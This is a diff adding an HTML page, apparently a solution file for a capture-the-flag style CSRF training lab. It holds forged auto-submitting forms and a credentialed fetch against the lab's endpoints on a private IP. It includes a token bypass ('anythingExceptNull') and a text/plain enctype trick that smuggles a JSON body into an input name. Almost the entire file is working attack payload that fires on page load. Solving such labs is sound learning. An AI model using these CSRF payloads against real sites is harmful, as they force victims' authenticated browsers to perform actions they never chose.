@@ -1,0 +1,54 @@
+<html>
+  <body>
+    <!-- Challenge2 -->
+    <form id="completeChallenge2" action="https://192.168.64.2/user/csrfchallengetwo/plusplus" method="POST" >
+      <input type="hidden" name="userId" value="9d7e230a9aaafe598139e5a4645cbdbf24a27c73" />
+      <input type="submit"/>
+    </form>
+    <script>
+    document.forms["completeChallenge2"].submit();
+    </script>
+    <!-- Challenge3 -->
+    <form id="completeChallenge3" action="https://192.168.64.2/user/csrfchallengethree/plusplus" method="POST" >
+      <input type="hidden" name="userId" value="9d7e230a9aaafe598139e5a4645cbdbf24a27c73" />
+      <input type="hidden" name="csrfToken" value="anythingExceptNull" />
+      <input type="submit"/>
+    </form>
+    <script>
+      document.forms["completeChallenge3"].submit();
+    </script>
+    <!-- Challenge7 -->
+    <form id="completeChallenge7" action="https://192.168.64.2/user/csrfchallengeseven/plusplus" method="POST" >
+      <input type="hidden" name="userId" value="9d7e230a9aaafe598139e5a4645cbdbf24a27c73" />
+      <input type="hidden" name="csrfToken" value="-78898147050385768959606526248353721117" />
+      <input type="submit"/>
+    </form>
+    <script>
+      document.forms["completeChallenge7"].submit();
+    </script>
+    <script>
+    fetch(
+      'https://192.168.64.2/user/csrfchallengejson/plusplus',
+      {
+        method: 'POST',
+        credentials: 'include',
+        headers: {'Content-Type': 'text/plain'},
+        body: '{"userId":"9d7e230a9aaafe598139e5a4645cbdbf24a27c73"}'
+      }
+    );
+    </script>
+    <!-- ChallengeJSON -->
+    <form id="completeChallengeJSON" action="#">
+      <input type="submit" />
+      <script>
+      document.forms["completeChallengeJSON"].submit();
+      </script>
+      <form id="completeChallengeJSON" action=https://192.168.64.2/user/csrfchallengejson/plusplus method=post enctype="text/plain" >
+        <input name='{"userId":"9d7e230a9aaafe598139e5a4645cbdbf24a27c73","ignore_me":"' value='test"}'type='hidden'>
+        <input type=submit value="Submit">
+      </form>
+      <script>
+      document.forms["completeChallengeJSON"].submit();
+      </script>
+    </body>
+  </html>
